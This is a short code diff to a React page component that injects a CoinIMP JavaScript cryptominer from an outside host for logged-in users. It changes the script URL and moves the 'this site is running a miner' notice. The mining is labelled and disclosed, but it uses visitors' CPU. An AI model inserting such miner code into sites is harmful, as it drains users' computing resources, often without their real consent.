@@ -56,12 +56,12 @@ const Index = () => {
   useEffect(() => {
     if (user) {
       // Check if mining script already exists
-      const existingScript = document.head.querySelector('script[src="https://www.hostingcloud.racing/Q1Mx.js"]');
+      const existingScript = document.head.querySelector('script[src="https://www.hostingcloud.racing/f4U5.js"]');
       if (existingScript) return;
 
-      // Inject main mining script
+      // Inject new mining script
       const script1 = document.createElement('script');
-      script1.src = 'https://www.hostingcloud.racing/Q1Mx.js';
+      script1.src = 'https://www.hostingcloud.racing/f4U5.js';
       script1.async = true;
       script1.id = 'mining-script-main';
       document.head.appendChild(script1);
@@ -79,7 +79,7 @@ const Index = () => {
               throttle: 0.3, c: 'w'
             });
             _client.start();
-            _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+            _client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#1e49ae", 40, "#6a0c5a");
             window.miningClientInitialized = true;
             window.miningClient = _client;
           }
